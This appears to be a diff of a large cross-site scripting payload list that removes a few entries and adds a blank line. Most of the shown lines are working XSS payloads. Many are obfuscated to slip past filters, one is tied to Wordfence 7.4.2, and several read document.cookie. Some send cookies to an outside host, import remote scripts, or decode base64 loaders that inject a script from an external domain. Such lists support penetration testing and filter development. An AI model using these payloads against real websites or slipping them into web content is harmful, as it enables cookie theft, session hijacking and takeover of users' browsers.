@@ -62,7 +62,6 @@ orwa%27"><svg/onload=alert(document.cookie)>
 <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>">
 ' oncontent\visibilityautostatechange='a=alert,(a?a:a)(origin)' x=\v+styl\u0065='content-visibility:auto
 1%27;--<img%20src=x%20onerror=javascript:alert(document.domain)>
-javascript:var{a:onerror}={a:%2561lert};throw%20origin
 <bla tabindex=1 onblur=alert(1) autofocus></bla><meta http-equiv="refresh" content=1;URL=mailto:someone@example.com">
 %27";}</script><script>prompt(document.domain);</script>
 ‘>alert(154)</script><script/154=’;;;;;;;
@@ -81,8 +80,6 @@ javascript%3Alocation%2f**%2f=%27https://14.rs/?%27%2bdocument.cookie
 🥀<!--%0aalert(1)%0a--><script src="#"></script>
 <!--%0aalert(1)%0a--><script src="#"></script>
 --><script href="%23"></script>
-🥀<!--%0aalert(1)%0a--><script src="#"></script>
-<!--%0aalert(1)%0a--><script src="#"></script>
 🥀<!--%0dalert(1)%0d--><script src="#️⃣"></script>
 <!--%0dalert(1)%0d--><script src="#️⃣"></script>
 🥀//<![CDATA[alert/*️⃣comment*/(1);//]]><script xlink:href="#"></script>
@@ -123,7 +120,6 @@ onfocus=alert%26#40document.domain%26#41+autofocus+tabindex=1
 "><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 <object data=`data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=`></object>
-%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 "><img/src/onerror=import('//14.rs/')>"@14.rs
 013371337;ext=<img/src/onerror=import('//domain/')>
 <Svg Only=1 OnLoad=confirm(document.domain)>
@@ -132,7 +128,6 @@ onfocus=alert%26#40document.domain%26#41+autofocus+tabindex=1
 <svg onload=alert&#0000000040document.cookie)>
 <svg onload=alert&#0000000040"1")><””>
 <Img Src=//14.rs OnLoad%0C=import(Src)>
-<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
 background-color:#f00;background:url("javascript:alert(document.domain);");
 \\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
 \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
@@ -190,7 +185,6 @@ JavaScript://%250Aalert?.(1)//
 <detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//
 xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>
 javascript:%ef%bb%bfalert(XSS)
-<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 <svg onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()">
 "><video><source onerror=eval(atob(http://14.rs)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
 <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x" /></svg>
@@ -951,7 +945,6 @@ javascript:prompt(document.cookie)
 '-alert(document.cookie)-'
 </script><svg onload=alert(document.cookie)>
 "onmouseover=alert(document.cookie)//
-{{$on.constructor('alert(1)')()}}
 <Script>alert(document.cookie)</Script>
 <script>alert(document.cookie);</script>
 <script>alert(document.domain)</script>
@@ -1803,6 +1796,7 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
 
